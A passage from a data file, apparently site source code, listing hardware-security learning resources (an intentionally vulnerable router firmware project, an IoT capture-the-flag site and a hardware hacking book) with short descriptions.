        title: "Damn Vulnerable Router Firmware",
        url: "https://github.com/praetorian-inc/DVRF",
        description: "Praetorian's intentionally vulnerable firmware for MIPS and ARM — practice stack overflows, command injection, and backdoor discovery."
      },
      {
        title: "Exploit Security CTF",
        url: "https://exploitthis.ctfd.io/challenges",
        description: "Capture-the-flag challenges focused on embedded and IoT security — test your skills against real-world inspired scenarios."
      },
      {
        title: "The Hardware Hacking Handbook",
        url: "https://nostarch.com/hardwarehacking",
        description: "The definitive reference for hardware security research — covers everything from PCB analysis to fault injection to radio hacking, written by professional researchers."
      }
    ],
  },
];
